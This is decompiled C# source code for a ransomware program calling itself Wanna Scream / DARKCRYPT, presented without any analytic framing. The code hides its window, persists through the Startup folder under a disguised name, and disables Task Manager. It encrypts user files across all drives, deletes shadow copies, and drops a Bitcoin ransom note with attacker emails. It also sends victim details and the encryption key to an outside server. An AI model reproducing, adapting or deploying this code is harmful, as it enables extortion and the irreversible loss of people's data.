using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using SF;
using Wanna_Scream.Properties;

namespace Wanna_Scream;

internal class main
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private static readonly string Root = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static readonly string SystemDisk = Path.GetPathRoot(Root);

	public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string MyComputerDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);

	private static readonly string DesktopDirectoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static readonly string FavoritesDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

	private static readonly string MyDocumentspDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string MyMusicDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static readonly string HistoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.History);

	private static readonly string PersonalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string DownloadsDirectory = Interaction.Environ("USERPROFILE") + "\\Downloads";

	private static readonly string DocumentsDirectory = Interaction.Environ("USERPROFILE") + "\\Documents";

	private static readonly string PicturesDirectory = Interaction.Environ("USERPROFILE") + "\\Pictures";

	private static readonly string VideosDirectory = Interaction.Environ("USERPROFILE") + "\\Videos";

	private static readonly string MusicDirectory = Interaction.Environ("USERPROFILE") + "\\Music";

	private static readonly string UserProfile = Interaction.Environ("USERPROFILE");

	public static string[] ValidExtension = new string[123]
	{
		".exe", ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".sxw",
		".stw", ".3ds", ".max", ".3dm", ".ods", ".sxc", ".stc", ".dif", ".slk", ".wb2",
		".odp", ".sxd", ".std", ".sxm", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf",
		".odb", ".mdf", ".ldf", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".vbs", ".sch",
		".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf", ".fla",
		".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".mkv", ".flv",
		".wma", ".mid", ".m3u", ".m4u", ".svg", ".psd", ".tiff", ".tif", ".raw", ".gif",
		".png", ".bmp", ".jpg", ".jpeg", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar",
		".bak", ".ARC", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".dwg", ".pdf",
		".wk1", ".wks", ".rtf", ".csv", ".txt", ".msg", ".pst", ".ppsx", ".ppsm", ".pps",
		".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw",
		".xlsb", ".xlsm", ".xlsx", ".xls", ".dotm", ".dot", ".docm", ".docx", ".doc", ".ndf",
		".pdf", ".ib", ".ibk"
	};

	private static string readme = "[+] All Your Files Have Been Encrypted [+]\r\n\r\n [-] Do You Really Want To Restore Your Files?\r\n [+] Write Us To The E-Mail : _em1_\r\n [+] If you did not get any response until 24 hours later,Write to this E-Mail : _em2_\r\n [-] Write Your Unique-ID In The Title Of Your Message.\r\n [+] Unique-ID : _pcid_\r\n [-] You Have To Pay For Decryption In Bitcoins.\r\n [-] The Price Depends On How Fast You Write To Us.\r\n [-] After Payment We Will Send You The Decryption Tool \r\n That Will Decrypt All Your Files.\r\n _______________________________________________\r\n\r\n          [+] Free Decryption As Guarantee [+]\r\n\r\n [-] Before Paying You Can Send Us Up To 5 Files For \r\n Free Decryption, The Total Size Of Files Must Bee Less\r\n Than 10MB, (Non Archived) And Files Should Not Contain\r\n Valuable Information (Databases, Backups, Large Excel\r\n -Sheets, Etc). \r\n _______________________________________________\r\n\r\n             [+] How To Obtain Bitcoins [+]\r\n\r\n [-] The Easiest Way To Buy Bitcoins Is LocalBitcoins \r\n Site : https://localbitcoins.com/buy_bitcoins \r\n You Have To Register, Click 'Buy Bitcoins', And Select\r\n The Seller By Payment Method And Price.\r\n [-] Also You Can Find Other Places To Buy Bitcoins And\r\n Beginners Guide Here: \r\n http://coindesk.com/information/how-can-i-buy-bitcoins \r\n _______________________________________________\r\n\r\n                  [+] Attention! [+]\r\n\r\n [-] Do Not Rename Encrypted Files.\r\n [-] Do Not Try To Decrypt Your Data Using Third Party\r\n -Software, It May Cause Permanent Data Loss.\r\n [-] Decryption Of Your Files With The Help Of Third\r\n Parties May Cause Increased Price (They Add Their Fee\r\n To Our) Or You Can Become A Victim Of A Scam.\r\n \r\n _________________DARKCRYPT_Ransomware___________________\r\n";

	private static string[] Emails = new string[2] { "Filemgr@tutanota.com", "Cryptor6@tutanota.com" };

	private static string Soldier = "@Hamido18";

	public static string Key { get; } = KeyGenerator.GetUniqueKey(133);


	private static string[] Folder { get; set; }

	private static string[] Files { get; set; }

	private static string ProgramData { get; } = SystemDisk + "\\ProgramData";


	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void SendRndString()
	{
		long bytes = 0L;
		try
		{
			List<long> list = new List<long>();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					list.Add(driveInfo.TotalSize - driveInfo.TotalFreeSpace);
				}
			}
			bytes = list.Sum((long x) => Convert.ToInt64(x));
		}
		catch
		{
		}
		try
		{
			using WebClient webClient = new WebClient();
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
			string text = "\r\nAttacker: " + Soldier + "\r\nTarget ID: " + GetID() + "\r\nTarget Name: " + Environment.MachineName + "\r\nTarget OS: " + smethod_1() + "\r\nTarget Hard: " + smethod_0(bytes) + "\r\nTarget Cpu: " + smethod_2() + "\r\nTarget IP: " + new WebClient().DownloadString("http://icanhazip.com") + "\r\nTarget Location: https://www.ip-tracker.org/locator/ip-lookup.php?ip=" + new WebClient().DownloadString("http://icanhazip.com") + "\r\nTarget Cryptography: " + Key + "\r\n";
			webClient.DownloadString("http://recoverydata.merehosting.com/api/aa.php?text=" + text);
		}
		catch (Exception ex)
		{
			File.WriteAllText("logs.log", "[ERR] " + ex.Message + "\r\n[KEY] " + Key);
		}
	}

	private static string GetID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
		val.Get();
		if (!string.IsNullOrEmpty(((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString()))
		{
			return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		}
		string text = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementClass("Win32_Processor").GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (text == string.Empty)
				{
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("ProcessorId").get_Value()
						.ToString();
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static void Main(string[] args)
	{
		SendRndString();
		ShowWindow(GetConsoleWindow(), 0);
		StartUPAdd();
		SetTaskManager(enable: false);
		while (true)
		{
			RunEncrypt();
			SearchDisk();
			DeleteShadowCopy();
			File.WriteAllText("WannaScream.hta", Resources.Wanna_Scream.Replace("_email2_", Emails[1]).Replace("_email1_", Emails[0]).Replace("_id_", GetID()));
			for (int i = 0; i < 1; i++)
			{
				Process.Start("WannaScream.hta");
			}
		}
	}

	private static void DeleteShadowCopy()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process process = new Process();
			process.StartInfo = startInfo;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	public static void RunEncrypt()
	{
		foreach (string item in new List<string>
		{
			DesktopDirectory,
			MyComputerDirectory,
			DesktopDirectoryDirectory,
			MyDocumentspDirectory,
			MyMusicDirectory,
			HistoryDirectory,
			PersonalDirectory,
			DownloadsDirectory,
			DocumentsDirectory,
			PicturesDirectory,
			VideosDirectory,
			MusicDirectory,
			UserProfile,
			FavoritesDirectory,
			ProgramData,
			SystemDisk + "\\Users\\"
		})
		{
			SearchFolder(item);
			SearchFile(item);
		}
	}

	internal static void SearchDisk()
	{
		foreach (DriveInfo item in from x in DriveInfo.GetDrives()
			where x.IsReady
			select x)
		{
			if (item.Name != SystemDisk)
			{
				SearchFolder(item.Name);
			}
			else
			{
				SearchFile(item.Name);
			}
			SearchFile(item.Name);
		}
	}

	internal static void SearchFolder(string name)
	{
		try
		{
			Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
		}
		catch (Exception)
		{
			return;
		}
		string[] folder = Folder;
		foreach (string name2 in folder)
		{
			SearchFile(name2);
			SearchFolder(name2);
		}
	}

	internal static void SearchFile(string name)
	{
		string[] validExtension = ValidExtension;
		foreach (string text in validExtension)
		{
			try
			{
				Files = Directory.GetFiles(name, "*" + text, SearchOption.TopDirectoryOnly);
			}
			catch (Exception)
			{
				break;
			}
			string[] files = Files;
			for (int j = 0; j < files.Length; j++)
			{
				Encrypt(files[j]);
			}
		}
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		return rijndaelManaged.CreateEncryptor().TransformFinalBlock(input, 0, input.Length);
	}

	private static void SetTaskManager(bool enable)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (enable && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void StartUPAdd()
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Runtime Broker.exe");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\WannaScream.hta", Resources.Wanna_Scream.Replace("_email2_", Emails[1]).Replace("_email1_", Emails[0]).Replace("_id_", GetID()));
		}
		catch
		{
		}
	}

	internal static void Encrypt(string name)
	{
		try
		{
			if (!(new FileInfo(name).Name != "README.txt"))
			{
				return;
			}
			if (!File.Exists(Path.GetDirectoryName(name) + "\\README.txt"))
			{
				try
				{
					File.WriteAllText("README.txt", readme.Replace("_pcid_", GetID()).Replace("_em1_", Emails[0]).Replace("_em2_", Emails[1]));
				}
				catch
				{
				}
			}
			byte[] bytes = AesEncrypt(File.ReadAllBytes(name), Key);
			File.WriteAllBytes(name, bytes);
			File.Move(name, name + "[" + Emails[0] + "][" + GetID() + "].WannaScream");
		}
		catch (Exception)
		{
		}
	}

	[CompilerGenerated]
	internal static string smethod_0(long bytes)
	{
		try
		{
			string[] array = new string[5] { "B", "KB", "MB", "GB", "TB" };
			double num = bytes;
			int num2 = 0;
			while (num2 < array.Length && bytes >= 1024L)
			{
				num = (double)bytes / 1024.0;
				num2++;
				bytes /= 1024L;
			}
			return $"{num:0.##} {array[num2]}";
		}
		catch
		{
			return string.Empty;
		}
	}

	[CompilerGenerated]
	internal static string smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		object obj = (from ManagementObject x in (IEnumerable)new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get()
			select ((ManagementBaseObject)x).GetPropertyValue("Caption")).FirstOrDefault();
		if (obj == null)
		{
			return "N/A";
		}
		return obj.ToString();
	}

	[CompilerGenerated]
	internal static string smethod_2()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return string.Empty;
	}
}
